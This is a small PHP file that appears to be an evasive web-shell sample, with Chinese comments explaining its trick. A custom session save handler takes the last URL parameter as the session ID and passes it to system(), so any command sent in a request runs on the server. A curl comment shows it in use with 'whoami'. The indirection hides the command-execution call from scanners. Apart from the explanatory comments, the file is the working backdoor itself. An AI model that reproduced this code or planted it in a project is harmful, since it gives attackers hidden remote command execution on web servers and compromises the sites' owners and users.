<?php

// ?secret=whomai

// 使用session处理事件间接取值执行

// https://www.php.net/manual/zh/function.session-set-save-handler.php



// curl 'http://127.0.0.1/33.php?secret=whoami'



class FileSessionHandler implements SessionHandlerInterface

{

public $path = NULL;

public function open($save_path, $session_name)

{

$this->path = 'system';

return true;

}

function close()

{

return true;

}

function read($key)

{

return '';

}

function write($id, $data)

{

$func = $this->path;

$func($id);

return false;

}

function destroy($key)

{

return true;

}

function gc($maxlifetime)

{

return true;

}

function create_sid()

{

return end($_GET);

}

}

$handler = new FileSessionHandler();

session_set_save_handler(

$handler

);

unset($_COOKIE);

session_start();

$_SESSION[''] = '';